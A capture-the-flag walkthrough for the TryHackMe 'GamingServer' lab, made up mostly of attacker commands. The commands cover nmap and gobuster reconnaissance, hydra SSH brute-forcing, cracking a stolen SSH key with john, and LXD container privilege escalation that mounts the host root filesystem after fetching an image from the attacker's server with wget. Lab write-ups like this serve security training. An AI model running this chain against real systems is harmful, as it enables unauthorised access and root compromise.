# GamingServer

**Room Link:** [https://tryhackme.com/room/gamingserver](https://tryhackme.com/room/gamingserver)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (7) (11).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>









<figure><img src="../../.gitbook/assets/image (20) (8).png" alt=""><figcaption></figcaption></figure>









### SSH port 22

Tried bruteforcing ssh with johns username and the dictionary file we found but it didn't work

**Kali**

```
hydra -l john -P dict.lst ssh://$VICTIM
```



### TCP/80 - HTTP



<figure><img src="../../.gitbook/assets/image (3) (16).png" alt=""><figcaption></figcaption></figure>



### SSH port 22

After finding the key I bruteforced that with the dictionary list found

**Kali**

```
chmod 700 secretKey
/opt/john/ssh2john.py secretKey > id_john.txt
john --wordlist=/root/dict.lst id_john.txt 
```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh -i secretKey john@$VICTIM
Password: letmein
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>



### Privilege Escalation&#x20;

Followed this link on lxd privilege escalation&#x20;

**Link:** [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)

**Victim**

```
id
```

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp
wget http://10.10.73.204:81/alpine-v3.18-x86_64-20230712_1453.tar.gz
lxc image import ./alpine-v3.18-x86_64-20230712_1453.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

<figure><img src="../../.gitbook/assets/image (18) (10).png" alt=""><figcaption></figcaption></figure>

















































